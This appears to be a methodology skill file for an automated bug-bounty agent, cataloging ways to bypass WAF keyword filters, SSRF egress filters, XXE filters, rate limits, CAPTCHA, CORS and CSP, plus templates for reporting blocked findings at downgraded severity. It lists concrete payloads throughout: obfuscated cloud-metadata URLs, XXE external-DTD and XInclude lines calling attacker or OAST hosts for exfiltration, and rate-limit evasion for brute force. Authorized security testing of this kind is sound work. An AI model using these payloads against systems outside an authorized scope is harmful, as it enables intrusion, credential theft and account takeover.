---
name: block_bypass_strategies
category: methodology
description: A block is not a refutation — per-block-class bypass catalogs (WAF keyword filters, SSRF egress filters, rate limits, CSP, origin checks, content-type filters, CAPTCHA, size caps) plus partial-exploitation framing for when the primitive exists but the chain is gated.
depends_on: []
---

# Block Bypass Strategies

The single most expensive mistake a hunter can make is collapsing these
two questions into one:

1. **Does the underlying vulnerability exist?**
   (The XML parser still resolves entities. The fetcher still makes
   outbound requests. The SQL driver still parses payloads.)
2. **Does the exploit path reach all the way to impact?**
   (WAF strips the keyword. Egress firewall blocks the outbound. Rate
   limiter shuts you down after 3 attempts.)

When you hit a block, question 1 is almost always still YES. The bug is
there — the chain is gated. That means: try the bypass, and if the chain
is genuinely unreachable, report the primitive at downgraded severity
with OAST / timing / side-channel evidence. **Never mark the candidate
`rejected` or `no_exploit_path` just because the response was 403.**

## When to Use

- You got a 403, 415, 413, 429, 451, or a WAF block page back
- You see "connection refused" / "no route to host" during SSRF testing
- Your XXE / SQLi / SSTI / XSS payload is silently stripped or reflected
  as a neutralised string
- CSP blocks your payload execution in the browser
- CAPTCHA appears after 2-3 probes
- You are *about* to call `review_vulnerability_candidate` with verdict
  `rejected` / `no_exploit_path` — always run this skill first

## The First Move: Call classify_block

Before trying random bypasses, call the `classify_block` tool with the
blocked response's headers + body + status code. It returns the block
class (Cloudflare / Akamai / Imperva / AWS WAF / egress filter / rate
limit / CAPTCHA / origin / content-type / size / CSP / auth / scope) and
a ranked list of bypass hints specific to that class, PLUS a critical
`primitive_still_valid` flag.

If `primitive_still_valid == True`, the underlying bug is still
reportable at downgraded severity even if you cannot bypass — that's
the minimum commitment before dismissal.

## Per-Class Bypass Catalogs

### WAF Keyword Filters (Cloudflare / Akamai / Imperva / AWS WAF / generic)

Symptoms: 403 with vendor-branded block page; payloads containing
`UNION`, `<!ENTITY`, `<script>`, `../` get stripped or 403'd.

1. **Case juggling**: `UNION` -> `UnIoN`, `SELECT` -> `SeLeCt`,
   `<script>` -> `<ScRiPt>`. Many WAFs lowercase-compare specific tokens.
2. **Comment interleaving**:
   - SQLi: `UN/**/ION SEL/**/ECT`
   - XSS: `<scr<script>ipt>` (nested reflection defeats the first strip)
   - SSTI: `{{'a'+<!---->'b'}}` for Jinja2, `#{<!---->config}` for Ruby
3. **Encoding variants**: single URL-encode (`%55` for `U`), double URL-
   encode (`%2555`), HTML entities (`&#x55;`), Unicode fullwidth
   (`Ｕ Ｎ Ｉ Ｏ Ｎ`), base64 in parameters that get decoded server-side.
4. **Parameter pollution**: duplicate the param — first copy benign, second
   copy payload. Many WAFs see only the first; some backends merge both.
   `?id=1&id=1 UNION SELECT ...`.
5. **Content-type swap**: send the payload as JSON if the WAF rules
   trigger only on form-encoded; as XML if JSON is inspected; as
   multipart/form-data with a nested part; as application/soap+xml.
6. **Body-type vs query-string**: many WAFs inspect the body but not the
   query string (or vice versa). Move the payload.
7. **Headers and less-inspected fields**: put the payload in a header
   the app reads (e.g. X-Forwarded-For, Referer, User-Agent, custom
   API-key header), in the Content-Type boundary, in a cookie, in a
   JSON key instead of a JSON value.
8. **Chunked transfer encoding**: split the keyword across chunks —
   `UN\r\n3\r\nION\r\n`.
9. **HTTP/2 request splitting**: WAFs that only inspect HTTP/1 miss
   payloads inside HPACK-compressed headers.
10. **Null / tab / newline separators inside the keyword**:
    `UN%09ION`, `UN%0aION`, `UN%00ION`.
11. **Method switch**: if GET is inspected but POST is not (or vice
    versa), switch. Also try PATCH / PUT for endpoints that accept them.
12. **TLS fingerprint**: some WAFs profile by JA3 — a different client
    (curl vs requests vs Go vs headless Chrome) changes the fingerprint.

### SSRF Egress Filters (the 169.254.169.254 block)

Symptoms: fetcher returns 500 / empty / "connection refused" / "no route
to host" when targeting internal IPs; metadata endpoint returns error
but public URLs work.

**OAST first, always.** Point the target at your interactsh / Burp
Collaborator domain. If you see a DNS lookup on your OAST, the SSRF
primitive is confirmed regardless of whether you can reach
`169.254.169.254`. That alone is typically Medium; Critical when the
target is a cloud-hosted service where metadata access means IAM
credentials.

1. **IP obfuscation** for the metadata host:
   - Decimal: `http://2852039166/` = `169.254.169.254`
   - Hex: `http://0xa9fea9fe/`
   - Octal: `http://0251.0376.0251.0376/`
   - IPv4-mapped IPv6: `http://[::ffff:169.254.169.254]/`
   - Missing octets: `http://169.254.169/` (some parsers complete)
2. **DNS rebinding**: use a short-TTL hostname (rbndr.us,
   lock.cmpxchg8b.com, Singularity of Origin) that first resolves to a
   public allowlisted IP, then flips to `169.254.169.254` on the second
   lookup during the fetch.
3. **Protocol switch**: `gopher://`, `dict://`, `file://`, `jar://`,
   `netdoc://`. Gopher is especially powerful for Redis / FastCGI /
   SMTP smuggling.
4. **Redirect chain**: start at an allowed URL
   (`https://attacker.com/redirect`) that 302s to the internal target.
   Many fetchers re-validate only the initial URL.
5. **Userinfo / fragment tricks**:
   - `http://allowed@attacker.com/` — parser differential
   - `http://attacker.com#@169.254.169.254/` — fragment before host in
     some parsers
   - `http://attacker.com\\@169.254.169.254/` — backslash confusion
6. **Cloud-metadata variants**:
   - **AWS IMDSv1**: simple GET to `169.254.169.254/latest/meta-data/`
   - **AWS IMDSv2**: PUT to `/latest/api/token` with header
     `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then GET with
     `X-aws-ec2-metadata-token`. If the sink can set headers or do PUT,
     IMDSv2 is reachable.
   - **GCP**: `http://metadata.google.internal/computeMetadata/v1/`
     REQUIRES `Metadata-Flavor: Google` header.
   - **Azure**: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
     REQUIRES `Metadata: true` header.
7. **Blind side channels** when no response body comes back:
   - Time diff (connection to internal IP blocks quickly vs times out
     on NAT'd routes)
   - Response size diff
   - TLS handshake error class
8. **If nothing works**: report the SSRF primitive (server-side fetch of
   user-controlled URL) as Medium with OAST evidence. Many programs
   still pay on SSRF primitives even without a full internal read.

### XXE Keyword Filters

Symptoms: `<!DOCTYPE`, `<!ENTITY`, or `SYSTEM` keyword gets stripped /
403'd; text/xml bodies are WAF-inspected.

1. **Parameter entities** instead of general entities:
   ```xml
   <!DOCTYPE foo [
     <!ENTITY % p SYSTEM "http://oast/x.dtd">
     %p;
   ]>
   ```
   Many WAFs only rule on general `<!ENTITY x SYSTEM>`; parameter
   entities (`<!ENTITY % x ...>`) slip through.
2. **External DTD** — host the real payload off-site:
   ```xml
   <!DOCTYPE foo SYSTEM "http://your-oast/evil.dtd">
   ```
   The request body contains NO suspicious keywords except the DTD URL.
   The parser fetches the DTD, which contains the real entity
   definitions and exfiltration logic.
3. **OAST-first**: any DNS lookup from the XML parser to your OAST
   proves the parser resolves external references. That's the
   primitive. Report it.
4. **Encoding tricks**: UTF-16LE / UTF-16BE bodies with BOM. Many WAFs
   decode only UTF-8.
5. **Content-Type routing**: `application/xml` vs `text/xml` vs
   `application/soap+xml` vs `application/xhtml+xml` vs
   `application/rss+xml`. Each may hit a different parser with
   different WAF rules.
6. **Upload vectors**: SVG / DOCX / XLSX / PDF / GPX embed XML.
   Uploaded SVG still hits the server-side parser during image
   processing / OCR / thumbnail generation. WAFs rarely inspect
   uploaded binary content.
7. **XInclude** (bypasses ENTITY-focused WAFs entirely):
   ```xml
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include href="http://oast/exfil"/>
   </foo>
   ```
8. **CDATA obfuscation**: `<![CDATA[<!ENTITY x SYSTEM "http://oast">]]>`
   inside the DOCTYPE section.
9. **If nothing works**: report the XML parser's external-reference
   behavior at Medium with OAST DNS evidence.

### Rate Limiting

Symptoms: 429 / `Retry-After` header / "too many requests" after 3-5
attempts.

1. **Header rotation**: X-Forwarded-For, X-Real-IP, X-Originating-IP,
   X-Client-IP, X-Remote-IP, True-Client-IP, CF-Connecting-IP,
   Forwarded: for=. Rotate the value per request.
2. **Account alternation**: between brute-force attempts, do one
   legitimate login on a different account. The counter often resets.
3. **Endpoint variants**: `/login` vs `/api/v1/login` vs `/api/v2/login`
   vs mobile endpoints vs GraphQL. Same backend function, different
   rate-limit bucket.
4. **Case / path mutation**: `/Login`, `/login/`, `/login?x=1`, `/./login`,
   `/login%20`. Many rate-limit keys are literal-string.
5. **HTTP/2 single-packet attack** (James Kettle): send N requests
   inside one TCP frame so they arrive simultaneously — defeats
   sequential rate counters and enables race-condition classes.
6. **Token / API-key rotation**: create multiple tokens and rotate.
7. **Backup auth methods**: OAuth, SAML, SSO, magic-link — same
   account, different rate-limiter.
8. **Time-of-day**: some limits reset per-hour, per-minute, or per-
   clock-second boundary. Observe the window and batch attempts.

### CAPTCHA

Symptoms: hCaptcha / reCAPTCHA / Turnstile appears after 2-3 attempts.

1. **Bypass by endpoint variant**: mobile API and legacy endpoints
   often skip CAPTCHA.
2. **Token replay**: check whether the server validates a captcha
   token per-request or only verifies its presence. Many verify
   presence.
3. **reCAPTCHA v3 score manipulation**: v3 returns a score the server
   uses for risk; some servers accept any score > 0. Inspect their
   threshold.
4. **Legitimate solution** via 2captcha / anti-captcha services — this
   is a valid research technique as long as it stays within the
   program's terms of service.
5. **Flow bypass**: find the authenticated flow that doesn't gate on
   CAPTCHA (already-logged-in session, OAuth redirect, API key).

### Origin / CORS Blocks

Symptoms: "origin not allowed" / CORS errors / 403 on cross-origin
requests.

1. **Null origin**: sandboxed iframe (`<iframe sandbox>`) produces
   `Origin: null`. If the check allowlists `null`, any attacker page can
   bypass by embedding a sandboxed frame.
2. **Suffix confusion**: `evil-target.com`, `target.com.evil.com`,
   `target.com%2eevil.com`. Test whether the check is prefix-match,
   suffix-match, contains, or exact.
3. **Trailing dot**: `https://target.com.` (note the trailing period)
   often bypasses exact-equality while still resolving to the same IP.
4. **IDN homoglyphs**: Cyrillic `а` (U+0430) vs Latin `a`.
5. **Protocol juggle**: `http://target.com` vs `https://target.com`
   — the check may only match on scheme+host.

### Content-Type Filters

Symptoms: 415 / "unsupported media type" / payload stripped by
content-type-specific inspector.

1. **Swap to a less-inspected Content-Type**:
   `application/soap+xml`, `application/x-www-form-urlencoded`,
   `multipart/form-data`, custom application-specific types.
2. **Case variants**: `Application/JSON`, `APPLICATION/JSON`.
3. **Missing Content-Type entirely** — the server often guesses and the
   WAF stops inspecting.
4. **Duplicate Content-Type** headers with different values — parsers
   pick one, WAFs may choose the other.

### Size Limits

Symptoms: 413 / "entity too large" / body truncated.

1. **Chunked transfer encoding** can defeat size-based inspection.
2. **Split the payload**: store part 1 via one endpoint, trigger via
   part 2. Useful for stored-XSS / second-order injection.
3. **Compressed body** (gzip / deflate / br) — inspection cap is
   usually on decompressed size but the request body is small.

### CSP Violations

Symptoms: payload reaches the browser but scripts don't execute due to
"Content Security Policy" block.

1. **JSONP / allowlisted scripts**: `script-src 'self'` is bypassable if
   there's a same-origin JSONP endpoint, a polyfill that evaluates a
   URL parameter, or an uploaded `.js` file.
2. **AngularJS sandbox** on pages with `unsafe-eval`.
3. **strict-dynamic pivot**: find an already-loaded trusted script that
   dynamically injects attacker content.
4. **connect-src gaps**: even without script execution, data exfil via
   `fetch` to an allowed endpoint is often possible.
5. **Cross-subdomain execution**: store the XSS on `sub.target.com` if
   its CSP is more permissive, then pivot via shared cookies.

## Partial-Exploitation Reporting

When bypass attempts genuinely fail but `classify_block` said
`primitive_still_valid == True`, do NOT dismiss. Report at the
appropriate downgraded severity. Standard framings:

| Primitive | Blocked state | Reportable as |
|---|---|---|
| SSRF (server makes outbound request) | Can't reach internal | Medium — server-side request forgery with OAST-confirmed egress; impact limited by egress filtering |
| XXE (parser resolves external entities) | Can't exfil / can't reach internal | Medium — XML External Entity processing enabled; OAST-confirmed external reference resolution |
| SQLi (injectable query) | WAF strips payloads | Medium — time-based blind SQL injection with {N}s delay differential measurable |
| XSS (reflected / stored) | CSP blocks execution | Low-Medium — reflected HTML / JavaScript injection; direct exploitation blocked by CSP, but relaxed CSP on subdomain/endpoint would execute |
| Auth bypass (role check absent) | Specific endpoint still gated | Medium — missing authorization check on {endpoint}; {other endpoint} enforces it — inconsistency indicates systemic weakness |

### Report wording template

> **Severity**: Medium (primitive confirmed; exploitation path blocked by
> {WAF / egress / rate limit}; reported per "block is not a refutation"
> framing — see XXX for analogous accepted reports).
>
> **Impact**: The underlying {primitive} is present in {endpoint}. OAST
> evidence confirms {specific side-channel proof of primitive}. A full
> chain to {terminal impact} is currently blocked by {block class /
> vendor}, but this block is not part of the application's security
> model and could be bypassed at any time via {list the 2-3 most likely
> bypasses you tried and what specifically blocked them}. Recommend
> fixing at the primitive layer rather than relying on the block.

## Self-Check Before Dismissing

Before you call `review_vulnerability_candidate` with verdict
`rejected` / `no_exploit_path` / `expected_behavior`:

- [ ] Did you call `classify_block` on the blocked response?
- [ ] Did you try at least 3 class-specific bypass techniques?
- [ ] Did you attempt OAST confirmation of the underlying primitive?
- [ ] Did you check `primitive_still_valid` in the classifier response?
- [ ] If `primitive_still_valid == True` and bypasses failed, did you
      create a partial-exploitation candidate at downgraded severity?

If any of these are NO, you have more work to do before the dismissal
is defensible. The self-repair system will nudge you if it sees you
dismissing after recent block signals without having done the above.

## Pro Tips (Corpus-Evidenced, Bypass-Specific)

1. **Patch-bypass hunting is the highest-ROI methodology on mature platforms.** When a security fix ships: (a) read the patch diff to identify the EXACT input space it now blocks, (b) enumerate inputs that are semantically equivalent but syntactically outside the patch's check, (c) test each within 24-72 hours of the fix (before a second patch). The patch localizes exactly where defenders looked — everything adjacent is under-tested. Three bypass families: incomplete regex (anchor/boundary miss), new encoding that the patch doesn't normalize, and alternate code path that skips the patched function entirely. ($225K intent-redirection sandbox escape was a patch bypass; $33K command injection was a patch bypass; $10K Google Maps XSS was a fix bypass; $2.5K nginx config injection was a CVE bypass.) This single methodology accounts for more high-bounty findings per hour invested than any other in the corpus.

2. **6-layer SSRF bypass ladder — test ALL layers before declaring a filter safe.** Layer 1: direct internal target (`http://localhost`). Layer 2: IP obfuscation (decimal/hex/octal/IPv6-mapped). Layer 3: DNS rebinding (rbndr.us, short-TTL flip). Layer 4: protocol switch (`gopher://`, `file://`, `dict://`). Layer 5: redirect chain (302 from allowed host to internal target). Layer 6: parser differential (`http://allowed@attacker.com/`, `http://attacker.com#@internal/`, backslash confusion). Most filters block layers 1-2; layers 3-6 are where the $50K+ SSRF bounties live. Run ALL six even if early layers succeed — deeper layers may reach different internal surfaces.

3. **WAF rule regression testing after updates.** WAF vendors ship rule updates weekly. Each update can: (a) break existing rules that previously blocked your payloads, (b) introduce new parser behaviors that create bypass paths, (c) change header inspection scope (e.g., stop inspecting a header they previously checked). After any WAF version change you detect (via `Server` header, block page wording, or timing change), re-run your full payload corpus. Regressions are common and ephemeral — the bypass window may last only days.

4. **Filter vs. protection layer confusion — the $0 vs. $10K distinction.** A WAF/rate-limiter/CAPTCHA is a FILTER (external, removable, not part of the security model). A cryptographic check, RBAC enforcement, or input validation in application code is a PROTECTION (integral, part of the security model). When a filter blocks you, the underlying vulnerability still exists — report it at downgraded severity with the primitive confirmed via OAST/timing. When a protection blocks you, the vulnerability may genuinely not exist. Triagers who confuse these will reject valid filter-blocked findings. Your report must explicitly state: "The block is a {filter/protection}. Filters are not part of the application's security model and can be bypassed or removed."

5. **IPC intermediary abuse for security boundary bypass.** When a security boundary exists between two components (e.g., web content and native code), map every inter-process communication channel that crosses that boundary. For each IPC endpoint: (a) can you reach it from the less-privileged side? (b) does the receiver validate the sender's identity or just the message format? (c) can you chain two IPC calls where the first establishes trust and the second exploits it? The intermediary (browser process, service worker, intent handler) often has broader permissions than either endpoint. ($14K Android Chrome intent handling, $225K Google Play intent redirection — both IPC intermediary abuse.)

## Cross-References

- `ssrf.md` — SSRF primitive catalogue (use with the egress-filter
  bypasses above)
- `xxe.md` — XXE primitive catalogue
- `waf_bypass.md` — deeper WAF-vendor-specific techniques
- `oast_out_of_band.md` — OAST setup for primitive confirmation
- `methodology/triage_validity.md` — the 7-question gate (do NOT
  answer `severity_correct: yes` without acknowledging the block /
  partial framing in the justification)
- `methodology/exploit_maturity.md` — how to assess whether a
  primitive-only finding is payable
